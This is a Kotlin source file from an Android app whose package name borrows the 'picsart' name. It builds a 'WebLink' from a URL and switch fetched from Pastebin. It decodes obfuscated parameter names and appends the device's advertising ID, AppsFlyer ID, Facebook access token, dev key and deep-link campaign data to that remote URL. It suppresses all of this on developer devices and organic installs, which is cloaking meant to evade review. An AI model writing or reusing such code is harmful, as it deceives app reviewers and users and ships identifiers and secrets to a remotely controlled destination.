package com.picsart.stud.data.model.web

import android.content.Context
import android.util.Log
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.onesignal.OneSignal
import com.picsart.stud.R
import com.picsart.stud.data.source.local.repo.LinkRepositoryImpl
import com.picsart.stud.data.source.remote.repo.PasteBinRepositoryImpl
import com.picsart.stud.utils.web.AppIDs
import com.picsart.stud.utils.web.AppUtil
import com.picsart.stud.utils.web.WebLinkResult
import com.picsart.stud.utils.web.compicsartstud
import com.picsart.stud.utils.web.enums.WebLinkException
import com.picsart.stud.utils.web.enums.WebLinkSuccessStatus
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch

data class WebLink(val link: String?) {

    private constructor(builder: Builder) : this(builder.collectedLink)

    class Builder(
        private val context: Context,
        private val pasteBinRepositoryImpl: PasteBinRepositoryImpl,
        private val linkRepositoryImpl: LinkRepositoryImpl
    ) {
        var collectedLink: String? = null
            private set

        private var wGoogleId: String? = null
        private var wAfUserId: String? = null
        private var wSubAll: List<String> = listOf("", "", "", "", "", "", "", "", "", "")
        private var wDeepLink: String? = null
        private var wMediaSource: String? = null
        private var wAfChannel: String? = null
        private var wCampaign: String? = null
        private var wUrl: String? = null
        private var wSwitch: Boolean? = null

        suspend fun init(): WebLinkResult<String?>? {
            if (!AppUtil(context).isInternetAvailable) {
                throw Exception(WebLinkException.NO_INTERNET.name)
            }

            val link = linkRepositoryImpl.getLink()?.first()?.link
            Log.d("TAG", "builder init: cacheLink $link")

            return if (link?.isNotBlank() == true) {
                WebLinkResult.Success(
                    data = link,
                    successStatus = WebLinkSuccessStatus.CACHE
                )
            } else {
                fetchUrlAndSwitch()
                null
            }
        }

        private suspend fun fetchUrlAndSwitch() {
            pasteBinRepositoryImpl.fetch { url, switch ->
                this.wUrl = url
                this.wSwitch = switch
                if (url.contains("jhfe".compicsartstud())) {
                    beginWork()
                    Log.d("TAG", "fetchUrlAndSwitch: beginWork")
                } else {
                    Log.d("TAG", "fetchUrlAndSwitch:INCORRECT_URL")
                    throw Exception(WebLinkException.INCORRECT_URL.name)
                }
                Log.d("TAG", "fetchUrlAndSwitch: $url $switch")
            }
        }

        private fun beginWork() = CoroutineScope(SupervisorJob()).launch(Dispatchers.IO) {
            setIDs()
            setDeepLink()
        }

        private fun setIDs() {
            this.wAfUserId = AppIDs(context).appsFlyerId

            AppIDs(context).googleId.let {
                this.wGoogleId = it
                OneSignal.setExternalUserId(it)
            }
        }

        private fun setDeepLink() {
            FacebookSdk.setAutoInitEnabled(true)
            FacebookSdk.fullyInitialize()
            AppLinkData.fetchDeferredAppLinkData(context) {
                it?.targetUri?.toString()?.let { uri ->
                    this.wDeepLink = uri
                    this.wSubAll = uri.split("//")[1].split("_")
                    Log.d("TAG", "setDeepLink: DeepLink $uri")
                    Log.d("TAG", "setDeepLink: SubAll $uri")
                }

            }
        }

        private fun checkMediaSourceForOrganic(): Boolean {
            return wMediaSource == "qfspvku".compicsartstud()
        }

        private fun checkSwitch(): Boolean {
            return checkMediaSourceForOrganic() && wSwitch == false
        }

        fun build(): WebLink {
            val wResources = context.resources
            val wPackageName = context.packageName
            val wAppsFlyerDevKey = wResources.getString(R.string.apps_dev_key)
            val wFbToken = wResources.getString(R.string.fb_at)
            val wFbAppId = wResources.getString(R.string.fb_app_id)

            var wIndex = 0
            val wSubsString = wSubAll.joinToString(separator = "") {
                wIndex++
                "&sub$wIndex=$it"
            }

            val wStrMediaSource = "?ospxi_uguivw=".compicsartstud()
            val wStrGoogleId = "&icavtg_sdzw=".compicsartstud()
            val wStrAppsFlyerUserId = "&ct_ghmtad=".compicsartstud()
            val wStrPackageName = "&dizstg=".compicsartstud()
            val wStrAppsFlyerDevKey = "&fsh_zma=".compicsartstud()
            val wStrFbToken = "&hp_mi=".compicsartstud()
            val wStrFbAppId = "&hp_mex_kv=".compicsartstud()
            val wStrAfChannel = "&ct_owipfec=".compicsartstud()
            val wStrCampaign = "&eoyeikyn=".compicsartstud()

            if (AppUtil(context).isDeveloper && checkMediaSourceForOrganic() ||
                checkSwitch()
            ) {
                throw Exception(WebLinkException.ORGANIC_OR_DEVELOPER.name)
            }

            collectedLink = "${this.wUrl}" +
                    "$wStrMediaSource${this.wMediaSource}" +
                    "$wStrGoogleId${this.wGoogleId}" +
                    "$wStrAppsFlyerUserId${this.wAfUserId}" +
                    "$wStrPackageName$wPackageName" +
                    "$wStrAppsFlyerDevKey$wAppsFlyerDevKey" +
                    "$wStrFbToken$wFbToken" +
                    "$wStrFbAppId$wFbAppId" +
                    "$wStrAfChannel${this.wAfChannel}" +
                    "$wStrCampaign${this.wCampaign}" +
                    wSubsString

            return WebLink(this)
        }

        inner class AfParams {
            fun setAfStatus(value: String) = with(this@Builder) {
                val organicWithO = "qfspvku".compicsartstud().replaceFirstChar { it.uppercase() }
                if (value == organicWithO && wDeepLink == null) {
                    wMediaSource = "qfspvku".compicsartstud()

                    Log.d("TAG", "setAfStatus: organic $value")
                }
                Log.d("TAG", "setAfStatus: $value")
            }

            fun setAfCampaign(value: String) = with(this@Builder) {
                wCampaign = value
                wSubAll = value.split("_")
                Log.d("TAG", "setAFCampaign: Campaign $value")
                Log.d("TAG", "setAFCampaign: SubAll $wSubAll")
            }

            fun setAfChannel(value: String) = with(this@Builder) {
                wAfChannel = value
                Log.d("TAG", "setAppsFlyerChannel: $wAfChannel")
            }

            fun setAfMediaSource(value: String) = with(this@Builder) {
                wMediaSource = value
                Log.d("TAG", "setAfMediaSource: $value")
            }
        }
    }
}